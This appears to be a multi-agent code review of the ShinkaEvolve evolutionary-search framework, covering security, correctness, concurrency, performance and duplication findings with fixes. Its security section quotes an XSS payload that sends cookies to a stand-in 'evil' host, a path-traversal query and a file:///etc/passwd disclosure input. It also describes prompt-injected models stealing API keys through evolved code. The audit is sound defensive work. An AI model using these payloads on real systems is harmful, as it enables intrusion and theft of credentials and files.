# ShinkaEvolve — Deep Technical Review

**Date:** 2026-07-17
**Scope:** Full repository — `shinka/` package (~40k LOC Python + ~21.6k LOC web UI), `tests/` (~15k), `examples/` (~4.3k), CI workflows, git hooks.
**Method:** Five parallel role-based review agents (security, correctness/concurrency, performance, code-duplication, web-UI), each reading source directly. Headline findings in this report were independently spot-verified against the code; two `apply_diff` bugs (C1, C2) were reproduced by executing the real code.

> ShinkaEvolve is a research framework for LLM-driven evolutionary program search. It queries LLM APIs, writes generated programs to disk, **executes them locally or via Slurm**, stores results in SQLite, and serves a web UI for visualization. This execution-of-generated-code model is intentional and shapes the security analysis below.

---

## Executive summary

The codebase is capable and feature-rich, with genuinely good foundations in places (parameterized SQL throughout, `yaml.safe_load`, tuned SQLite PRAGMAs + WAL, a vectorized bandit, secrets kept out of the DB and git history). The concerns cluster in five areas:

| Area | Headline | Worst severity |
|---|---|---|
| **Security** | Visualization server binds `0.0.0.0`, no auth, CORS `*`, path traversal → unauthenticated arbitrary-file read on the LAN; stored XSS from LLM content rendered as raw HTML | High |
| **Correctness** | `apply_diff` corrupts programs silently (substring match; dropped deletion hunks) and accepts them as valid evolutions; multiple `correct=True, score=0.0` corruption paths | Critical |
| **Concurrency** | Job-monitor race drops running jobs + leaks eval slots → potential deadlock; Ctrl-C orphans subprocesses/Slurm jobs; timeout kills only the direct child | High |
| **Performance** | Two missing indexes on the hottest columns; per-request full-DB re-serialization in the web UI; O(N²) novelty scan; per-call DB reconstruction in the async loop | High |
| **Duplication** | ~3,300+ duplicated lines dominated by **hand-copied sync↔async twinning**; the sync copies are unit-tested but dead in production while the live async copies are untested and have drifted, producing ~13 latent bugs | High |

**The single most important structural fact:** in the core subsystems (database events, summarizer, novelty judge, prompt evolver, LLM providers) the framework ships a synchronous class and a hand-copied asynchronous twin. Tests cover the **sync** copies. Production runs the **async** copies. The copies have drifted, so several bugs listed below live specifically in the untested, live path.

---

## 1. Security

The security posture is **good on fundamentals but weak at the web-UI boundary and in the code-execution trust model**. Both the security and web-UI agents independently converged on the same server findings, which increases confidence.

### What's already solid (verified)
- **SQL is consistently parameterized** across `dbase.py`, `async_dbase.py`, `prompt_dbase.py`, `visualization.py` — no string-built queries with user data. The only f-string interpolations into SQL are integer `LIMIT`/`OFFSET` values (`islands.py:905`, `island_sampler.py:51/78`, `inspirations.py:178/189`) — not injectable.
- Config loading uses `yaml.safe_load`; no secrets logged or persisted to the DB / W&B (config dataclasses hold no secrets).
- `.env` is gitignored and absent from git history; `release_check.py` guards the PyPI artifact.
- CI avoids `pull_request_target`; PRs run without secrets; integration secrets are gated to `main`/dispatch.

### High severity

**S1 — Visualization server: binds all interfaces, no auth, CORS `*`, + path traversal → unauthenticated arbitrary SQLite/file read.** `shinka/webui/visualization.py`.
- Binds `0.0.0.0`: `ReusableTCPServer(("", port), ...)` at **1740** (banner at 1741 confirms). Every endpoint is unauthenticated.
- CORS wildcard: `send_header("Access-Control-Allow-Origin", "*")` at **1681** on all JSON responses.
- Path traversal: the `db_path` query param is used verbatim — `_get_actual_db_path` is a **verified no-op** (**428–430**, `return db_path`) and every handler does `os.path.join(self.search_root, db_path)` (**449, 546, 616, 694, 785, 843, 891, 948, 1035, 1134**). Because `os.path.join(root, "/abs")` discards `root`, `?db_path=/home/victim/secret.db` (or `../`) opens **any SQLite DB on the host** and returns its contents; `handle_get_meta_content` likewise `open()`s `meta_*.txt` outside root (843–859).
- Combined impact: anyone on the LAN — or, via CORS/DNS-rebinding, a web page the operator visits — can enumerate and exfiltrate arbitrary SQLite databases and text files from the host.
- **Fix:** default-bind `127.0.0.1`, make external exposure an explicit `--host` opt-in paired with an auth token; drop the CORS wildcard; add one shared path guard that rejects absolute/`..`, canonicalizes via `os.path.realpath`, and enforces `os.path.commonpath([resolved, realpath(search_root)]) == realpath(search_root)`; validate `processed_count` as `int` before interpolation.

**S2 — Stored XSS: LLM-generated content rendered as raw HTML.** `shinka/webui/viz_tree.html`. The page loads `marked` (unpinned, line 2077) and renders attacker-influenced DB fields **without any sanitizer** (DOMPurify count = 0):
- `6009` `marked.parse(data.metadata.thought)` → `nodeDetailsContainer.innerHTML` (6022) — the LLM "thought" becomes live HTML.
- `2868/2872`, `3073/3076/3134/3148–3160` — meta-analysis text/insights/diff via `marked.parse` → `innerHTML` (3042).
- Independently of `marked`, raw DB fields are interpolated into `innerHTML`: `5693` `agentName`/`patch_name`, `5697` `data.error`, `8177` `patchName`, `8186` `model`, `17656/17660` prompt `name`/`description`. Inconsistent — sibling fields like `statusLabel` (8176) and `prompt_text` (17707) *are* escaped.
- **Amplifier:** three `escapeHtml` definitions exist (3204, 6194, 18006); JS hoisting makes the **last win** — the variant that escapes `& < >` but **not `"`/`'`**, so every attribute-context use is still open to attribute breakout (e.g. reflected via `?db_path=` at `3989` `onclick="loadDatabase('${dbPath}')"`).
- Payload: an evolved program or prompt-injected model emitting `<img src=x onerror=fetch('http://evil/?'+document.cookie)>` in any LLM field runs when the operator opens the node — and that script can then hit the S1 endpoints.
- **Fix:** route every `marked.parse` output through `DOMPurify.sanitize`; HTML-escape all interpolated untrusted fields; consolidate to one quote-escaping `escapeHtml`; build `on*` handlers via `addEventListener`, not string interpolation; pin `marked`.

**S3 — (By-design, under-mitigated) Evolved code executes with no sandbox in `local` mode, inheriting the full environment including all API keys.** `wrap_eval.py:load_program` (29–37) `importlib` + `exec_module` on the LLM-written file; `local.py` starts the eval with `env = os.environ.copy()` (98) passed as `env=env` (112). The evolved program therefore inherits **every** provider secret in the environment. A prompt-injected or adversarial model can emit code that exfiltrates all keys or reads the filesystem, with no isolation in `local` mode (only the optional Slurm/Docker paths isolate, and even those inherit secrets via `eval_env`). This is intentional, but the trust boundary is undocumented and the env is un-scoped.
- **Fix:** document the trust boundary prominently; allow-list only the vars the eval needs (strip provider secrets from the eval subprocess env); recommend Docker mode with minimal mounts for untrusted models.

### Medium severity
- **S4 — Shell command construction via unescaped f-strings** in `slurm.py` (`_render_env_exports` :20, `_render_env_docker_flags` :27, `submit_local_docker`/`submit_local_conda` `bash -lc` strings at 440–449/482–493, `.format()` sbatch scripts at 240–274/329–354). Operator-config-controlled today (not a remote vector), but any `eval_env` value derived from untrusted data would inject shell. **Fix:** `shlex.quote` all interpolated values; prefer argv lists / Docker `--env-file`.
- **S5 — PDF export renders untrusted LLM HTML through `wkhtmltopdf`** without `--disable-local-file-access`/`--disable-javascript` (`visualization.py:_generate_pdf`, subprocess at 1510; WebKit loads `file://` and remote URLs). `<img src="file:///etc/passwd">` in meta content → local-file disclosure / SSRF into the PDF. **Fix:** sanitize the HTML (bleach allow-list) and pass the disable flags.
- **S6 — `/plot_file/` containment is weak.** `handle_serve_plot_file` (981–1025) checks `abs_path.startswith(abs_search_root)` using `os.path.abspath` (not `realpath`) with **no trailing separator** and **after** the existence check — sibling dir `<root>_bak` bypasses, in-root symlinks (which LLM programs can create) are followed, and any extension is streamed. **Fix:** `realpath` + `commonpath`, restrict to image extensions, check before touching the file.
- **S7 — 9–10 third-party scripts loaded from CDNs with no SRI** (`viz_tree.html:2075–2084`, `compare.html:8`); `marked` and `plotly` are unpinned (`latest`). CDN compromise or version drift injects arbitrary JS into the session that handles the DB. **Fix:** pin exact versions + add SRI hashes, or vendor locally.

### Low / informational
- Single-threaded server + long blocking ops (retry sleeps 5s×8, two 30s PDF subprocess timeouts) = trivial DoS; add `ThreadingTCPServer`.
- Missing `X-Content-Type-Options: nosniff`; PDF `Content-Type` sent on the plain-text fallback path.
- `SimpleHTTPRequestHandler` base serves directory listings for unmatched paths after `os.chdir(webui_dir)`; override `list_directory` → 403.
- `headless.py` `shell=True` (218) is invoked with `shlex.join` (not currently injectable) but is an avoidable smell.
- `pickle.load` of bandit state (`prioritization.py:220`) — local-trust; RCE only if an attacker plants the pickle.
- `env.py` `load_dotenv(override=True)` (26) lets a package-root `.env` shadow real environment variables; consider `override=False`.
- `claude.yml` triggers `claude-code-action` on `@claude` from any GitHub user (prompt-injection / billing-DoS surface); read-only permissions limit blast radius — consider restricting to members.
- **Operational (not a code finding):** the working tree's `.env` holds live third-party API keys. Correctly gitignored and not in history, but worth rotating if this tree was ever shared or backed up.

---

## 2. Correctness & concurrency

Selection everywhere filters `WHERE correct = 1` (`dbase.py:1571`), so the dangerous corruption class is **anything that records `correct=True` with a wrong or zeroed score, or accepts wrong code as valid** — exactly what the top findings do. None of the findings below are covered by existing tests.

### Critical

**Q1 — `apply_diff` matches SEARCH as a *substring* of an unrelated line → silent wrong-location corruption (reproduced by execution).** `apply_diff.py:75` uses `original_text.find(search_text)` (substring, not line-anchored) with no uniqueness/boundary check, applied via `.replace(matched_search, replace, 1)` at 656. Executed:
```
original: "maxval = 100\nresult = 5"   SEARCH "xval = 10" / REPLACE "xval = 999"
=>        "maxval = 9990"   num_applied=1, error=None
```
The caller's only success gate is `error is None and num_applied > 0` (`async_runner.py:3719`, fix path 3485), so the corrupted program is archived. If the corruption happens to still evaluate, it enters the archive as a legitimate result. **Fix:** require whole-line/boundary-anchored matching; reject when SEARCH is non-unique in the mutable region.

**Q2 — Deletion hunk (empty REPLACE body) silently dropped; the multi-hunk patch still reports success (reproduced by execution).** `PATCH_PATTERN` (12–15) requires a newline on **both** sides of the REPLACE body, so a deletion (empty REPLACE) doesn't match at all. Executed: a lone deletion parses 0 blocks (`num_applied=0`, `error=None`, file unchanged); a `[replace + deletion]` patch parses 1 block, reports `num_applied=1, error=None`, and the line the LLM asked to delete **remains**. The evolved program silently differs from the specification and is archived as valid. **Fix:** make the REPLACE body optional in the regex and assert `parsed_block_count == count("<<<<<<< SEARCH")`, rejecting on mismatch.

### High

- **Q3 — Job-monitor race drops a concurrently-appended running job → job loss + eval-slot leak → potential deadlock.** `async_runner.py:2052–2101`. `concurrently_added_jobs` is snapshotted at 2053, but the loop `await`s `cancel_job_async` at 2087 (yields the loop); a proposal task can `running_jobs.append(...)` at 2945 during that await; line 2101 overwrites the list from the stale snapshot, dropping the new job. Its eval slot (leased at 5076) leaks; enough leaks → `LogicalSlotPool.acquire()` blocks forever. **Fix:** recompute survivors by diffing a *fresh* `list(self.running_jobs)` by `id()` after the loop.
- **Q4 — `correct.json` is written before `metrics.json`, so a partial write yields `correct=True, score=0.0` (verified).** `wrap_eval.py:save_json_results` writes the success marker first (94–95) and the score second (99–100), outside the try/except. Any interruption between them (timeout SIGKILL, OOM, **disk-full during the larger metrics write**) records a program that *passed* as a zero-scoring elite, which selection then admits. **Fix:** write `metrics.json` first and `correct.json` (the commit marker) last.
- **Q5 — Slurm completion is inferred solely from `squeue` emptiness — FAILED/TIMEOUT/OOM/CANCELLED are indistinguishable from success.** `slurm.py:499–518`; `squeue` lists only active jobs, so every terminal state returns `""` identically, and `load_results` then runs on whatever is on disk (compounding Q4). No `sacct`/`scontrol` anywhere. **Fix:** query `sacct -j <id> -o State` and gate success on `COMPLETED`.
- **Q6 — `squeue` error returns `None` → infinite monitor loop / job reported "running" forever.** `slurm.py:517–518` returns `None` on `CalledProcessError` (common for a departed/unknown job id); `None == ""` is False so the sync monitor never breaks, and the async `check_job_status` returns `None != "" → True` (running) with no wall-clock timeout on the Slurm branch. **Fix:** distinguish `None` (error) from `""` (gone); do an `sacct` final-state check on error.
- **Q7 — `local-` docker/conda job reports "completed" while still queued for a GPU.** `slurm.py:412` sets `popen=None` until GPUs free; `get_job_status` (505–508) returns `""` (= completed) while `popen is None`, so `load_results` runs before the eval starts → missing results or **stale results from a previous run in the same `results_dir`**. **Fix:** add a distinct "pending" state.
- **Q8 — Timeout kills only the direct child (no process group) → orphaned GPU-holding processes.** No `Popen` uses `start_new_session=True`; `conda run -n env python …` and `bash -lc "… docker run …"` fork children/containers that survive `.kill()` on the wrapper (`local.py:177`, `scheduler.py:359/458`). Orphans accumulate across generations and starve later evals. **Fix:** `start_new_session=True` + `os.killpg(os.getpgid(pid), SIGKILL)`, then reap.
- **Q9 — SIGINT/SIGTERM orphans all in-flight jobs.** `cli/run.py:504` / `launch_hydra.py:30` run with no signal handler; `run_async`'s `finally` cancels only asyncio tasks and calls `scheduler.shutdown()` (= `executor.shutdown(wait=True)`), never iterating `running_jobs` to cancel them. Ctrl-C leaves local subprocesses detached and Slurm jobs on the cluster; the graceful shutdown can itself hang on a thread stuck in `job_id.wait()`. **Fix:** install a SIGINT/SIGTERM handler that sets `should_stop` and cancels each running job before shutdown.
- **Q10 — Resume mis-detected when only the initial program was persisted.** `async_runner.py:1194` gates resume on `self.db.last_iteration > 0`, but `last_iteration` only advances for `generation > last_iteration` and the initial program is `generation=0`. If the process dies after the initial program persists but before any evolved program lands, restart takes the fresh-start branch: it re-creates a **duplicate gen-0 cohort**, skips bandit/cost restore and `_restore_resume_progress`, and then over-counts completed generations by ~`num_islands` → **premature termination**. **Fix:** gate resume on persisted-program/gen-0-row existence, and guard initial-program creation against an existing gen-0 row.
- **Q11 — Empty/truncated LLM output accepted as a valid result; no `finish_reason` check.** `gemini.py:134–141` and `local_openai.py:78/139` return `content=""` as success, and no provider inspects `finish_reason`/`stop_reason`/`incomplete_details`, so a response cut at `max_output_tokens` with partial text is parsed and applied as a finished program. (OpenAI and Headless correctly raise on empty; the others don't.) **Fix:** raise on empty content; treat `finish_reason == "length"` as failed/incomplete.

### Medium
- **Q12 — `extract_between` returns the truthy string `"none"` on failure** (`llm.py:835`), which passes `if initial_code:` guards (`async_runner.py:1898–1905`), skips the intended retry, and is wrapped as the initial program body; `<NAME>`/`<DESCRIPTION>` callers store the literal `"none"`. Also type-inconsistent (`dict` on success, `str` on failure). **Fix:** return `None`/raise; callers test `is None`.
- **Q13 — `get_best_program` treats an exactly-`0.0` score as `-inf`** (`dbase.py:1615`, `p.combined_score or -float("inf")`). For a task whose best correct score is `0.0` among negative-scored peers, the best program is ranked worst. **Fix:** `-inf if p.combined_score is None else p.combined_score`.
- **Q14 — Island samplers overflow / invert preference** (opt-in strategies only; default `uniform` is safe). `island_sampler.py:150` `np.exp(fitness/temperature)` has no max-subtraction (overflow → `nan` → `np.random.choice` raises); `:196` `fitness**w / count**w` produces negative/`nan` weights and, for all-negative fitness, **favors the worse island**. **Fix:** stable softmax; clamp/guard non-finite and negative weights.
- **Q15 — `correct.json` decode is unguarded** (`general.py:89–91`), asymmetric with the guarded `metrics.json`; a truncated file raises out of `load_results` into job postprocessing, which only catches `asyncio.TimeoutError`. **Fix:** guard symmetrically, default `{"correct": False}`.
- **Q16 — Missing `combined_score` key → `correct=True, score=0.0` admitted** (`wrap_eval.py:432–442` only guards `if "combined_score" in metrics`). A user `aggregate_metrics_fn` that omits the key yields a zero-scoring "correct" elite. **Fix:** treat missing `combined_score` as incorrect.
- **Q17 — Novelty judge fails *open*** on empty/timeout LLM response (`novelty_judge.py:205–207` → `return True`), so a transient outage silently accepts candidates as novel. **Fix:** fail closed or retry; distinguish timeout from empty.
- **Q18 — `QueryResult.__str__` divides by zero when `output_tokens == 0`** (`result.py:70`, before the `if thinking_tokens > 0` guard) — reachable via Gemini safety-blocks and local-openai `max(out-think,0)`, so logging crashes on exactly the degenerate responses you want to log. **Fix:** guard the ratio on `output_tokens > 0`.

### Latent (real, currently masked by dead code)
- **Q19 — Non-atomic read-modify-write on best-program / `best_score_ever` / archive / island migration** (`dbase.py:2213–2359`, `islands.py:216–288/387–422`) across independent per-thread connections, with no compare-and-set or `BEGIN IMMEDIATE`. **Not exploitable today** — the background-worker pool (`_enqueue_background_side_effects`, `_ensure_background_side_effect_worker`, `_process_completed_job_batch`) has **zero call sites**; the live path runs maintenance sequentially in one coroutine under `processing_lock` with a `max_workers=1` write executor. It becomes a live lost-update/archive-overflow/duplicate-migration bug the moment that pool is wired up. **Fix direction:** delete the dead subsystem, or push compare-and-set into SQL under `BEGIN IMMEDIATE` before reviving it.

### Notable lower-severity `apply_diff` behaviors
Insertion always targets `mutable[-1]` and glues REPLACE onto the END-marker line with no separating `\n` (can defeat `validate_evolve_markers` for block-comment languages); the indentation "correction" (122–138) double-indents LLM-supplied absolute indentation (breaks Python structure) and converts tabs→spaces; a valid edit is false-rejected when identical text appears earlier in an immutable region. These make the diff engine the single riskiest correctness surface in the repo and the highest-value place to add tests.

---

## 3. Performance

Verified **already-correct** (not flagged): WAL + tuned PRAGMAs on writer connections; indexes on `programs(generation, timestamp, complexity, parent_id, children_count, island_idx, system_prompt_id)` and `system_prompts(...)`; embeddings persisted and reused (not re-embedded per generation); `prioritization.py` fully vectorized; bulk writes wrapped in single transactions (no per-row commits).

### High impact
- **P1 — Two missing indexes on the hottest columns: `combined_score` and `correct`.** The index list (`dbase.py:453–465`, verified) covers neither, yet ~6 hot per-generation queries filter/sort on them: `get_top_programs` (1787–1793, 2985–2991), `parents.py:162–173`, `inspirations.py:72–80`, `islands.py:311–316`, `island_sampler.py:51–56/78–83`. Each does a full table scan + filesort every generation. **Fix (highest-leverage one-liner):** `CREATE INDEX idx_programs_correct_score ON programs(correct, combined_score)` and `idx_programs_island_correct_score ON programs(island_idx, correct, combined_score)`.
- **P2 — Novelty check scans the whole island *twice* per candidate**, with per-row `json.loads` of a 768–1536-float embedding and a non-vectorized Python cosine (`dbase.py:2488–2718`; callers `novelty_judge.py:89/124`, `async_novelty_judge.py:94–137`). The query vector is re-`np.array`'d and re-normed per row, `np.dot` runs on raw Python lists (no BLAS), and when similarity is high a **second connection repeats the entire island scan** to recover an argmax it already had → O(N²) cumulative per run. **Fix:** return `(id, score)` in one pass; keep a cached L2-normalized `(N,d)` float32 matrix per island and compute `M @ q`.
- **P3 — Embeddings stored as JSON TEXT** are parsed on every read, and `SELECT *` (20+ sites) drags full code + three embedding arrays into ranking paths that only need `id`/`score`/`complexity` (e.g. weighted parent sampling parses megabytes of floats it discards). **Fix:** store embeddings as a `np.float32` BLOB (`.tobytes()`/`np.frombuffer`, ~4× smaller, ~10–50× faster) or a side table; replace `SELECT *` in sampling/metadata paths with narrow column lists. Underpins P2/P4/P5.
- **P4 — N+1 query pattern in parent & inspiration sampling** (`inspirations.py:82–127`, `parents.py:126–182`): `SELECT id …` then a per-row `get_program(id)` (`SELECT * … WHERE id=?` + full JSON parse); the archive fallback (`parents.py:169`) fires one query per correct program, unbounded. The sibling `TopKInspirationStrategy` (199–209) already does it right with one `SELECT p.*`. **Fix:** one `WHERE id IN (…)` / join, hydrate the full `Program` only for the winner.
- **P5 — Full PCA(2D)+PCA(3D)+GMM refit and full-table rewrite on every synchronous `add()`** (`dbase.py:938–942 → 2743–2817`, `embedding.py:277–356`): reloads and `json.loads` every embedding, refits scaler/PCA/GMM on the full set, and rewrites every row → O(N)/insert, O(N²)/run. The async path already throttles this to every 10 inserts in a background thread. **Fix:** apply the same throttling/lazy recompute to the sync path.
- **P6 — LLM SDK client re-instantiated on every query** (`query.py:34/74 → client.py`), each with its own httpx pool, torn down immediately — no HTTP keep-alive reuse across sequential queries, repeated on every retry. **Fix:** memoize clients by `(provider, model, structured_output)`; cache `AsyncOpenAI` per event loop.
- **P7 (async runner) — Every async DB op reconstructs a whole `ProgramDatabase`** (new connection + 5 metadata SELECTs + island manager + `COUNT`) per call, inside the nested `novelty × resample` per-generation loop (`async_dbase.py:288` and ~12 siblings; trigger `async_runner.py:2716`; `get_total_program_count_async` fires on every completed job). Cost grows with DB size, serialized through a 2-worker semaphore. **Fix:** pool long-lived read-only handles via `threading.local`; cache the count in memory and increment on insert.
- **P8 (async runner) — Slurm job monitor polls at 10 Hz, spawning a `squeue` subprocess *per job, per tick*** (`async_runner.py:2379` → `scheduler.py` → `slurm.py:510`): ~`10·N` `squeue` process spawns/second against `slurmctld` for jobs whose state doesn't change at 10 Hz. (Local jobs use cheap `Popen.poll()`.) **Fix:** adaptive 2–5s Slurm poll; one batched `squeue --jobs=id1,id2,…` per tick; reserve the 0.1s cadence for the local path.

### High impact — web UI server
- **P9 — Change-detection poll (every 3s) is not cheap.** `handle_get_program_count` (637–652) — meant to be a lightweight `COUNT(*)/MAX(timestamp)` check — instead opens a new connection, runs a full `attempt_log` scan with `json_extract`, and does a **disk `read_text()` per failed proposal**, forever. **Fix:** aggregate query only; cache failure payloads by path+mtime. *(Positive: the client does gate full reloads behind this count check rather than reloading blindly.)*
- **P10 — `/get_programs_summary` is uncached** (`visualization.py:541–576`) while the sibling `/get_programs` *is* cached — so the primary tree-data path re-reads and re-parses the entire `programs` table on every refresh that detects new data, continuously during active evolution. **Fix:** add the existing `db_cache` TTL invalidated by `(count, max_timestamp)`, or fetch incrementally.
- **P11 — `/get_programs` ships full code + full high-dim embeddings for every program, unpaginated, then recursively NaN-walks all of it** (`SELECT p.*` → `asdict` deep copy → `_clean_nan_values`). Mitigated (on-demand heatmap view, 5s cache) so it's a spike, not a continuous drain. **Fix:** paginate; select `id` + embedding only; a dedicated `/get_embeddings`; sanitize NaN in SQL / a vectorized pass.

### Medium impact
- Connection churn on the async/thread-safe DB surface (fresh `connect()`+`close()` per call, `PRAGMA journal_mode=WAL` re-run per event-log insert) — reuse a per-thread connection.
- `compute_percentile_async` and friends rebuild a whole `ProgramDatabase` for a one-line query, per correct program — reuse a read connection, compute the rank in SQL (benefits from P1).
- 13 `ORDER BY RANDOM()` sites do a full scan + sort to pick a few rows — use `COUNT(*)` + random `OFFSET`.
- `_find_most_similar_in_archive` deserializes full `Program` objects to compare one embedding each — `SELECT id, embedding` + vectorize.
- Prompt sampling over-fetches full prompt text + growing JSON lists it doesn't use — slim query, hydrate the chosen prompt only.
- Gemini embeddings make one API call per text plus a second token-count call per text (vs the OpenAI/Azure batched call) — batch and estimate tokens locally.
- LLM retry loops have no jitter, fixed/zero sleep, and retry all exceptions (including deterministic `ValueError`s), stacked on top of provider `backoff.expo` up to 20 tries → multiplicative lockstep retries.
- `summarize_diff`, `_save_patch_attempt_async` file reads, and `PromptSampler.sample()` run **synchronously on the event loop** per generation — offload with `run_in_executor`/`to_thread`.
- Web-UI render hot spots: `normalizeTreeRoots` deep-clones the entire node array (`JSON.parse(JSON.stringify)`) per data change; `mergeFullProgramData` is O(n·m) (use a `Set`); full SVG teardown+rebuild on every data change (use a keyed enter/update/exit join).

### Low / negative results
`prioritization.py` is genuinely vectorized (no O(n²)); the async LLM query path is genuinely non-blocking; `runtime_slots.py`/`pipeline_timing.py` are clean; `_get_total_api_costs` correctly offloads. Cold-path items (plotting `iterrows`/`apply`, CLI-startup regex, sklearn re-imports) are noted but not worth optimizing. One non-perf bug surfaced here and corroborated by the correctness agent: `prioritization.py:713` reuses the loop counter `k` as the cost-blend coefficient inside `_posterior_batch`, so the epsilon-greedy rollout runs once instead of `samples` times. Currently unreachable (all `select_llm` callers pass `samples=None`); rename the coefficient before the first `samples>1` call.

---

## 4. Code duplication

**~3,300+ verified duplicated/near-duplicate lines**, dominated by one pattern: **hand-copied sync↔async twinning**. The copies have drifted, and because the async copy is the one that runs in production while only the sync copy is tested, the drift has produced **~13 latent bugs** — the ones cross-listed in §2 and below.

### The dominant theme and its drift-bugs
The repo systematically ships a sync class and a hand-maintained async twin (database events, summarizer, novelty judge, prompt evolver, LLM clients/providers, embeddings, client factories). The live async copies have drifted from the tested sync copies. Concrete, mostly one-to-few-line bugs traceable to the drift (each verified):

1. **Async DB event log emits invalid JSON** — `async_dbase.py:918/971` `json.dumps(details)` vs sync `dbase.py:700/725` `json.dumps(clean_nan_values(details))`; NaN/Inf metrics produce non-standard `NaN`/`Infinity` tokens that crash strict re-parse. *(Verified — async path is missing the `clean_nan_values` wrapper.)*
2. **Parent sampling crashes on corrupt JSON** — `parents.py:307–348` re-parses 9 JSON columns with no try/except, unlike the canonical `_program_from_row`.
3. **DeepSeek async loses reasoning-token accounting** (`deepseek.py:151–152` drops `thinking_tokens`).
4. **Gemini `thinking_budget` default forks** — `1024` sync vs `0` async.
5. **Gemini retries an un-retryable error** — `catch (Exception,)` retries the structured-output `ValueError` guard `MAX_TRIES`×.
6. **Anthropic/DeepSeek raise on unknown-model pricing** where OpenAI/local fall back to $0.
7. **Sync `LLMClient.query` never sleeps between retries** (tight-loop hammering) while the five siblings sleep 1s.
8. **Async summarizer/novelty/evolver silently drop `llm_kwargs`** the sync copies pin → the live path uses default-sampled model/temperature.
9. **`_run_fix_patch_async` raises `NameError` on a first `None` response** (`async_runner.py:3572`, unguarded) where its twin guards with `in locals()`; the error is swallowed by a broad `except`, discarding accumulated costs/metadata.
10. `SystemPromptEvolver.__init__` ordering `TypeError` on its documented default (dormant — sync class never instantiated).
11. Dead method calling undefined `_construct_novelty_prompt`/`_parse_novelty_response`.
12. Web-UI dead shadowed functions (`escapeHtml` ×3 with divergent falsy behavior, `getSelectedNodeId` ×2, `formatScore` divergent).
13. Pricing overlay (`embedding_overrides`/`provider_aliases`) applied only at CSV-build time, never by the runtime normalizer → pinned prices silently drift on a models.dev refresh.

> **The most alarming structural fact:** in the core cluster, the tested copies are dead and the live copies are untested. Adding async-path tests should precede any consolidation.

### High-impact duplication clusters (consolidation targets)
- **Database:** async event-logging re-implements the INSERT SQL (~100 lines, DB-H1, bug #1); row→object JSON deserialization copied 3× (~210 lines, DB-H2, bug #2). → extract `serialization.py` + route async through the sync `record_*_event`.
- **Core sync/async twins:** `MetaSummarizer`/`AsyncMetaSummarizer` (~288), `NoveltyJudge`/`Async…` (~194), `SystemPromptEvolver`/`Async…` (~231), `_run_fix_patch_async`/`_run_patch_async` (~200) plus a 3rd copy in `_generate_initial_program`. → collapse each twin to one implementation; **add async tests first**.
- **LLM providers:** `@backoff.on_exception` decorator (10 copies), `backoff_handler` (5 copies; only `openai.py` honors `Retry-After`), per-provider query bodies (~250), cost/usage extraction (5 divergent impls), client factories (~110). → new `shinka/llm/providers/_retry.py` + shared `extract_costs`/`build_result` + a `{provider: (sync, async)}` registry.
- **Pricing:** two parallel models.dev→priced-row interpreters (runtime `pricing/` vs build-time `generate_csvs.py`, which even keeps two disagreeing row producers). → make `generate_csvs.py` a thin driver over `shinka.pricing`; apply overlay sections at runtime.
- **Plots:** five near-identical `*_compare` functions (>100 lines), the tab10 palette copied verbatim 5×, an axis-styling epilogue repeated 10+×. → `plots/style.py` (`apply_axis_style` + palette) + one `_plot_series_comparison`.
- **Web UI:** shared "chrome" CSS copy-pasted across all three HTML files (drifted: 1600 vs 1400px, differing logo sizes, `.header-link` vs `.back-link`); duplicated/dead JS helpers. → `shinka-common.css` + `shinka-utils.js`.
- **Edit:** `apply_diff_patch`/`apply_full_patch` share a ~50-line envelope that has **drifted** — the diff path normalizes whitespace/markers the full path doesn't, producing different baselines/backups for the same seed; the EVOLVE-marker grammar is encoded 3× with different strictness.
- **Examples/tests:** the subprocess `evaluate.py` harness is copy-pasted across 4 language examples (~120 lines each; `julia` dropped a `_failure_metrics` helper and inlined the dict 3×); `run_evo.py` scaffolding near-identical across all 8; the `test_edit_<lang>.py` skeleton copied 6× (julia's copy dropped the alias-coverage test); `conftest.py` is only 8 lines while `ProgramDatabase`/`DatabaseConfig` setup is re-created inline ~45× and fakes are duplicated across test files. → shared `shinka.eval` subprocess helper + `pytest.mark.parametrize` + populated `conftest.py` fixtures.

---

## 5. Web UI structure (context for future work)

`viz_tree.html` is a single self-contained **18,014-line** file: ~1,534 lines CSS (one `<style>`, 11–1545), ~540 lines HTML (1546–2086), and ~15,925 lines JS (one `<script>`, 2087–18012, ~209 functions). Two functions alone exceed a typical module — `renderGraph` ~870 lines (4172–5043) and `createCharts` ~1,230 lines (6539–7768) — which is ~36× the project's ~500-LOC guideline. The security (§1), XSS (S2), and render-performance (§3) issues above all trace back to this monolith and its lack of module/escaping boundaries. **Recommendation:** extract the JS into ES modules (data-fetch, tree-render, charts, analysis, prompts), move CSS to a stylesheet shared with `index.html`/`compare.html`, and route all DB-sourced content through one sanitizing render path — which fixes S2/S7, the dead-shadow bugs, and the CSS drift together.

---

## Prioritized remediation roadmap

**Tier 0 — Correctness of results (do first; these silently corrupt the archive).**
1. `apply_diff` whole-line/unique matching + assert hunk count (Q1, Q2) — with regression tests for substring collision and empty-REPLACE deletion.
2. Write `metrics.json` before `correct.json`; guard `correct.json` decode; treat missing `combined_score` as incorrect (Q4, Q15, Q16).
3. Fix the async event-log NaN JSON bug and parent-sampling try/except (dup bugs #1, #2).
4. Gate resume on gen-0-row existence, not `last_iteration > 0` (Q10).

**Tier 1 — Security (before any non-localhost exposure).**
5. Bind `127.0.0.1` + auth token; drop CORS `*`; one canonicalizing path guard across all `db_path`/meta/plot handlers (S1, S6).
6. Sanitize all `marked.parse` output (DOMPurify) + escape raw DB-field interpolations + one quote-escaping `escapeHtml`; pin `marked`; add SRI (S2, S7).
7. `wkhtmltopdf --disable-javascript --disable-local-file-access` + sanitize PDF HTML (S5).
8. Document the code-execution trust boundary; allow-list the eval subprocess env (S3).

**Tier 2 — Concurrency & robustness.**
9. Job-monitor fresh-list survivor recompute (Q3); `start_new_session` + `killpg` for eval subprocesses (Q8); SIGINT/SIGTERM handler that cancels running jobs (Q9).
10. Slurm state via `sacct`, distinguish error/gone, add a pending state (Q5, Q6, Q7).
11. Raise on empty/truncated LLM output; fail novelty closed; guard the token-ratio divide (Q11, Q17, Q18).

**Tier 3 — Performance.**
12. Add the two indexes (P1) — one-line, ~6 hot queries.
13. float32-BLOB embeddings + narrow `SELECT`s (P3); single-pass vectorized novelty (P2); pool DB connections in the async loop (P7).
14. Web UI: lightweight count poll + cache `/get_programs_summary` (P9, P10); adaptive batched Slurm poll (P8); memoize LLM clients (P6).

**Tier 4 — Duplication / maintainability (reduces future drift-bugs at the source).**
15. **Add async-path tests, then** collapse the sync/async twins (core, providers, database, factories).
